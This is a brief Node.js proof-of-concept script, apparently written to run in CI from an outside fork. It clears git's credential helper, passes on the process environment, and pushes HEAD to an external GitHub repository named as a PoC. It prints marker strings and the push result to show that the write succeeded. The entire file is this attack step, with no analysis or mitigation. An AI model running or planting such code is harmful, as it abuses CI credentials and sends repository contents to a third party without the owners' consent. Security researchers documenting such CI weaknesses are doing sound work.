const { spawnSync } = require("node:child_process");
console.log("OUTSIDER_FORK_TEST_RAN_20261015");
const result = spawnSync("git", [
  "-c", "credential.helper=", "push",
  "https://github.com/just4h1poc/eve-factory-owned-poc-20261015.git",
  "HEAD:refs/heads/poc-outsider-write-20261015"
], { encoding: "utf8", timeout: 30000, env: { ...process.env, GIT_TERMINAL_PROMPT: "0" } });
console.log("PUSH_EXIT=" + result.status);
console.log(result.stderr || "");
if (result.error) console.log("PUSH_ERROR=" + result.error.message);
if (result.status !== 0) process.exit(1);
